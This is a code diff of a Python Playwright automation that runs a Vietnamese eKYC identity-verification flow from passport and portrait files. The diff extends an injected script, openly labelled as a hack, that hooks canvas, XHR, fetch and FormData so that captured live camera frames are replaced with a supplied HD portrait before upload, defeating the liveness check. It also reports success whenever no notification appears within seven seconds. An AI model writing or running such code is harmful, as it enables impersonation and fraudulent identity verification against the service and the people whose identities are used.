@@ -42,9 +42,10 @@ class PlaywrightRunner:
 		passport_path: str,
 		portrait_path: str,
 		log: Callable[[str], None] | None = None,
+		apply_filter: bool = False,
 	) -> tuple[str, str]:
-		base64_img = get_face_frame_base64(portrait_path)
-		portrait_b64 = get_id_photo_base64(portrait_path)
+		base64_img = get_face_frame_base64(portrait_path, apply_filter=apply_filter)
+		portrait_b64 = get_id_photo_base64(portrait_path, apply_filter=apply_filter)
 		self._portrait_path = portrait_path  # Lưu lại để dùng ở trang xác nhận
 		try:
 			self._page.close()
@@ -145,8 +146,8 @@ class PlaywrightRunner:
 		if log:
 			log("Đã tải lên ảnh Hộ chiếu thành công")
 		
-		# Chờ 1s rồi bấm TIẾP THEO
-		self._page.wait_for_timeout(1000)
+		# Chờ 5s rồi bấm TIẾP THEO
+		self._page.wait_for_timeout(5000)
 
 		try:
 			next_btn = self._page.locator(
@@ -156,8 +157,8 @@ class PlaywrightRunner:
 			if log:
 				log("Đã bấm TIẾP THEO (sau khi load ảnh hộ chiếu)")
 			
-			# Chờ 1s cho bước TÔI ĐÃ HIỂU
-			self._page.wait_for_timeout(1000)
+			# Chờ 5s cho bước TÔI ĐÃ HIỂU
+			self._page.wait_for_timeout(5000)
 		except Exception as exc:
 			if log:
 				log(f"Lỗi khi bấm TIẾP THEO: {exc}")
@@ -176,23 +177,47 @@ class PlaywrightRunner:
 			if log:
 				log(f"Lỗi khi bấm TÔI ĐÃ HIỂU: {exc}")
 
-		# Chờ 1s trước trang xác nhận
-		self._page.wait_for_timeout(1000)
+		# Chờ kết quả eKYC (chuyển sang trang Xác nhận hoặc báo lỗi ngay lập tức)
+		try:
+			success_locator = self._page.locator("input[name='noicap']")
+			error_locator = self._page.locator(".ant-notification-notice")
+			either_locator = success_locator.or_(error_locator)
+			
+			# Đợi tối đa 20s cho 1 trong 2 cái xuất hiện
+			either_locator.first.wait_for(state="visible", timeout=20000)
+			
+			if error_locator.first.is_visible():
+				err_text = error_locator.first.inner_text()
+				if "không đạt" in err_text.lower() or "thử lại" in err_text.lower() or "lỗi" in err_text.lower():
+					if log: log(f"Lỗi eKYC ngay tại bước Xác thực khuôn mặt: {err_text.replace(chr(10), ' - ')}")
+					self._page.wait_for_timeout(2000) # Đợi 2s cho người dùng đọc
+					return "FAILED", err_text.replace('\n', ' - ')
+		except Exception:
+			pass
+
+		# Chờ thêm 5s trước khi điền form Xác nhận (nếu qua được bước trên)
+		self._page.wait_for_timeout(5000)
 		self._fill_confirmation_info(record, log)
 
-		result_text = ""
 		try:
 			notification = self._page.locator(".ant-notification-notice").first
-			notification.wait_for(state="visible", timeout=15000)
+			# Đợi 7 giây theo yêu cầu, nếu không có thì nhảy xuống except
+			notification.wait_for(state="visible", timeout=7000)
 			result_text = notification.inner_text()
 			if log:
-				# Format log into a single line to avoid messy logs
 				log_text = result_text.replace('\n', ' - ')
 				log(f"Đọc thông báo từ hệ thống: {log_text}")
+			
+			# Phân loại kết quả từ thông báo
+			status, message = self._classify_result(result_text)
 		except Exception:
-			result_text = self._page.inner_text("body")
-
-		status, message = self._classify_result(result_text)
+			# Quá 7 giây mà không có thông báo nào hiện lên -> Mặc định là thành công
+			if log:
+				log("Đợi 7s không thấy thông báo lỗi -> Tài khoản đã thành công!")
+			status, message = "SUCCESS", "Cập nhật thành công (Không có thông báo)"
+		
+		# Chờ 5s cuối cùng để xem kết quả trước khi đóng/chuyển web
+		self._page.wait_for_timeout(5000)
 		return status, message
 
 	# ------------------------------------------------------------------ #
@@ -271,15 +296,19 @@ class PlaywrightRunner:
 		  /* ---------- ULTIMATE HACK: Inject HD Portrait safely without breaking Liveness ---------- */
 		  const _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
 		  const _origToBlob    = HTMLCanvasElement.prototype.toBlob;
-		  let lastCapturedFaceRaw = "";
+		  const recentFaces = [];
 		  const hdPortraitRaw = "{portrait_b64}".split(',')[1];
 		  
 		  // 1. Theo dõi toDataURL để lấy mẫu ảnh (không thay đổi kết quả để liveness vẫn chạy mượt)
 		  HTMLCanvasElement.prototype.toDataURL = function(type, encoderOptions) {{
 		      const res = _origToDataURL.apply(this, arguments);
-		      if (res && res.length > 50000) {{
+		      // Hạ giới hạn xuống 5000 để bắt được cả những ảnh nền trơn bị nén dung lượng cực thấp
+		      if (res && res.length > 5000) {{
 		          const parts = res.split(',');
-		          if (parts.length === 2) lastCapturedFaceRaw = parts[1];
+		          if (parts.length === 2) {{
+		              recentFaces.push(parts[1]);
+		              if (recentFaces.length > 200) recentFaces.shift(); // Giữ 200 frame gần nhất (khoảng 6 giây)
+		          }}
 		      }}
 		      return res;
 		  }};
@@ -294,26 +323,31 @@ class PlaywrightRunner:
 		      return _origToBlob.apply(this, arguments);
 		  }};
 
+		  // Hàm hỗ trợ quét và thay thế
+		  function replaceFaceInPayload(bodyStr) {{
+		      if (typeof bodyStr !== 'string' || !hdPortraitRaw) return bodyStr;
+		      // Quét ngược từ frame mới nhất về cũ nhất
+		      for (let i = recentFaces.length - 1; i >= 0; i--) {{
+		          if (bodyStr.includes(recentFaces[i])) {{
+		              console.log("[FakeCam] HACKED! Gửi ảnh siêu nét lên server (Frame " + i + ").");
+		              return bodyStr.replace(recentFaces[i], hdPortraitRaw);
+		          }}
+		      }}
+		      return bodyStr;
+		  }}
+
 		  // 3. Đánh chặn XHR (Thay ruột gói tin API trước khi bay lên server)
 		  const _origXHRSend = XMLHttpRequest.prototype.send;
 		  XMLHttpRequest.prototype.send = function(body) {{
-		      if (typeof body === 'string' && lastCapturedFaceRaw && hdPortraitRaw) {{
-		          if (body.includes(lastCapturedFaceRaw)) {{
-		              console.log("[FakeCam] HACKED XHR! Gửi ảnh siêu nét lên server.");
-		              body = body.replace(lastCapturedFaceRaw, hdPortraitRaw);
-		          }}
-		      }}
+		      body = replaceFaceInPayload(body);
 		      return _origXHRSend.apply(this, arguments);
 		  }};
 
 		  // 4. Đánh chặn fetch API
 		  const _origFetch = window.fetch;
 		  window.fetch = async function(...args) {{
-		      if (args[1] && typeof args[1].body === 'string' && lastCapturedFaceRaw && hdPortraitRaw) {{
-		          if (args[1].body.includes(lastCapturedFaceRaw)) {{
-		              console.log("[FakeCam] HACKED fetch! Gửi ảnh siêu nét lên server.");
-		              args[1].body = args[1].body.replace(lastCapturedFaceRaw, hdPortraitRaw);
-		          }}
+		      if (args[1] && typeof args[1].body === 'string') {{
+		          args[1].body = replaceFaceInPayload(args[1].body);
 		      }}
 		      return _origFetch.apply(this, args);
 		  }};
@@ -321,9 +355,8 @@ class PlaywrightRunner:
 		  // 5. Đánh chặn FormData (Trường hợp API dùng form-data)
 		  const _origAppend = FormData.prototype.append;
 		  FormData.prototype.append = function(name, value, filename) {{
-		      if (typeof value === 'string' && lastCapturedFaceRaw && hdPortraitRaw && value.includes(lastCapturedFaceRaw)) {{
-		          console.log("[FakeCam] HACKED FormData! Gửi ảnh siêu nét lên server.");
-		          value = value.replace(lastCapturedFaceRaw, hdPortraitRaw);
+		      if (typeof value === 'string') {{
+		          value = replaceFaceInPayload(value);
 		      }}
 		      return _origAppend.apply(this, arguments);
 		  }};
@@ -515,10 +548,12 @@ class PlaywrightRunner:
 
 
 			if record.get("noi_cap"):
+				self._page.wait_for_timeout(5000)
 				self._page.fill("input[name='noicap']", record["noi_cap"])
 				if log: log(f"Đã điền Nơi cấp: {record['noi_cap']}")
 			
 			if record.get("ngay_cap"):
+				self._page.wait_for_timeout(5000)
 				# Tìm ô nhập "Ngày cấp" thông qua placeholder
 				date_input = self._page.locator("input[placeholder='Chọn thời điểm']").first
 				if date_input.count() > 0:
@@ -542,7 +577,7 @@ class PlaywrightRunner:
 			).filter(visible=True)
 			
 			if confirm_btn.count() > 0:
-				# Thực hiện ngay tức thì (bỏ wait 2s)
+				self._page.wait_for_timeout(5000)
 				confirm_btn.last.click()
 				if log: log("Đã bấm XÁC NHẬN thông tin")
 		except Exception:
